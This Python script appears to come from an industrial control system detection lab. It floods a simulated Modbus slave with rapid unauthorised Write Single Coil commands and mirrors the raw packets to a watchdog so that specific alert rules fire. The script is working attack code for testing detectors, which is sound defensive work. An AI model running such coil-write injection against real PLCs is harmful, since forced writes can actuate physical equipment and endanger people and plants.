"""
Coil Write Injection Attack Scenario

Sends rapid FC05 (Write Single Coil) commands to slave-1 and mirrors
them to the watchdog for passive detection.

Triggers rules:
- R-002: Unauthorised Write to Coils (because source is not the master)
- R-006: New Source IP (injector IP not in whitelist)
- R-008: Excessive Write Rate (> 20 writes in 10s)
"""

import time
import logging
import struct
from pymodbus.client import ModbusTcpClient
from scapy.all import IP, TCP, send

logger = logging.getLogger("injector")

SLAVE_IP = "192.168.100.21"
WATCHDOG_IP = "192.168.100.100"

def _mirror_to_watchdog(fc: int, unit_id: int, data: bytes):
    """Send a raw Modbus/TCP packet to the watchdog for passive capture."""
    mbap = struct.pack('>HHHBB', 0, 0, len(data) + 2, unit_id, fc)
    payload = mbap + data
    pkt = IP(dst=WATCHDOG_IP) / TCP(dport=502, sport=55556, flags='PA') / payload
    send(pkt, verbose=0)


def run():
    logger.info("Starting Coil Write Injection (T0855) against slave-1")

    client = ModbusTcpClient(SLAVE_IP, port=502)
    if not client.connect():
        logger.error("Failed to connect to %s", SLAVE_IP)
        return

    logger.info("  -> Sending 30 rapid FC05 (Write Single Coil) commands...")
    for i in range(30):
        coil_addr = i % 10
        try:
            client.write_coil(coil_addr, True, device_id=1)
        except Exception as exc:
            logger.debug("Write failed: %s", exc)

        # Mirror to watchdog
        _mirror_to_watchdog(5, 1, struct.pack('>HH', coil_addr, 0xFF00))

        # Fast enough to trigger R-008 (>20 writes in 10s)
        time.sleep(0.05)

    client.close()
    logger.info("Coil Write Injection complete.")
